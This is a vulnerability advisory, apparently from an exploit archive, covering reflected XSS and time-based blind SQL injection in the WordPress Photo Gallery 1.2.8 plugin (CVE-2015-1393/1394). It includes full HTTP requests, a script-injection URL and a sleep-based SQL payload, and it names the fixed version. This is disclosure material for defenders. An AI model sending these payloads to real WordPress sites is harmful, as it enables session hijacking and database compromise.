@@ -1,0 +1,105 @@
+id: 23212
+date: 01/29/2015
+title: WordPress Photo Gallery 1.2.8 XSS / SQL Injection Vulnerabilities
+author: Sven Schleier
+cves: CVE-2015-1393, CVE-2015-1394
+
+[CVE-2015-1394] Photo Gallery (Wordpress Plugin) - Multiple XSS Vulnerabilities Version 1.2.8
+
+----------------------------------------------------------------
+
+Product Information:
+
+Software: Photo Gallery (Wordpress Plugin)
+Tested Version: 1.2.8, released on 15.01.2015 and has over half a million downloads.
+Vulnerability Type: Cross-site Scripting (CWE-79)
+Download link to tested version: https://downloads.wordpress.org/plugin/photo-gallery.1.2.8.zip 
+Description: Photo Gallery is an advanced plugin with a list of tools and options for adding and editing images for different views. It is fully responsive. The product includes plugin for adding image galleries and albums to posts and pages, as well as multiple widgets. You can add images, providing detailed descriptions and tags, organize the galleries into different albums. (copied from https://wordpress.org/plugins/photo-gallery/)
+
+----------------------------------------------------------------
+
+Description of vulnerability:
+
+When an authenticated user is uploading a picture to a gallery the following POST request is sent to the server:
+
+
+POST /wordpress/wp-admin/admin-ajax.php?action=addImages&width=700&height=550&extensions=jpg,jpeg,png,gif&callback=bwg_add_preview_image& HTTP/1.1
+Host: <IP>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: <Wordpress-Cookie>
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 484
+
+importer_thumb_width=300&importer_thumb_height=300&importer_img_width=1200&importer_img_height=1200&upload_thumb_width=300&upload_thumb_height=300&upload_img_width=1200&upload_img_height=1200&files%5B%5D=&task=&extensions=jpg%2Cjpeg%2Cpng%2Cgif&callback=bwg_add_preview_image&sort_by=name&sort_order=asc&items_view=thumbs&dir=&file_names=&file_namesML=&file_new_name=&new_dir_name=&clipboard_task=&clipboard_files=&clipboard_src=&clipboard_dest=
+
+
+The following parameters in the POST body are vulnerable to XSS:
+
+- sort_by
+- sort_order
+- items_view
+- dir
+- clipboard_task
+- clipboard_files
+- clipboard_src
+- clipboard_dest
+
+The parameter sort_by can also be placed within the URL, all other parameters in the POST body can be deleted and the request method can be changed from POST to GET. Afterwards the following GET-request can be used to execute reflected XSS:
+
+http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=addImages&width=700&height=550&extensions=jpg,jpeg,png,gif&callback=bwg_add_preview_image&sort_by=name"><script>alert(1)<%2fscript>
+
+
+----------------------------------------------------------------
+
+Impact: 
+
+User of the Wordpress Backend can be attacked through the XSS vulnerability, when an attacker is exploiting the various vulnerable parameters. Therefore an attacker could execute for example Website Spoofing or Inject malicious JavaScript code in order to use attacking tools like BeEF.
+
+[CVE-2015-1393] Photo Gallery (Wordpress Plugin) - SQL Injection in Version 1.2.8
+
+----------------------------------------------------------------
+
+Product Information:
+
+Software: Photo Gallery (Wordpress Plugin)
+Tested Version: 1.2.8, released on 15.01.2015 and has over half a million downloads.
+Vulnerability Type: SQL Injection (CWE-89)
+Download link to tested version: https://downloads.wordpress.org/plugin/photo-gallery.1.2.8.zip 
+Description: Photo Gallery is an advanced plugin with a list of tools and options for adding and editing images for different views. It is fully responsive. The product includes plugin for adding image galleries and albums to posts and pages, as well as multiple widgets. You can add images, providing detailed descriptions and tags, organize the galleries into different albums. (copied from https://wordpress.org/plugins/photo-gallery/)
+
+----------------------------------------------------------------
+
+Vulnerability description:
+
+When an authenticated user is creating a new gallery a POST-request is sent to the application that is prone to SQL-Injection in the parameter "asc_or_desc".
+
+
+POST /wordpress/wp-admin/admin.php?page=galleries_bwg HTTP/1.1
+Host: <IP>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: <Wordpress-Cookie>
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+
+search_value=&page_number=1&search_or_not=&task=add&current_id=&ids_string=&asc_or_desc=asc&order_by=order
+
+
+The parameter asc_or_desc in the POST body is prone to a AND/OR time-based blind SQL-Injection. WIth the following payload a delay can be provoked in the request of additional 10 seconds:
+
+asc_or_desc=asc%2c(select%20*%20from%20(select(sleep(10)))a)
+
+
+----------------------------------------------------------------
+
+Solution:
+
+Update to the latest version, which is   1.2.11, see https://wordpress.org/plugins/photo-gallery/.
+
+
+#  0day.today [2023-03-23]  #
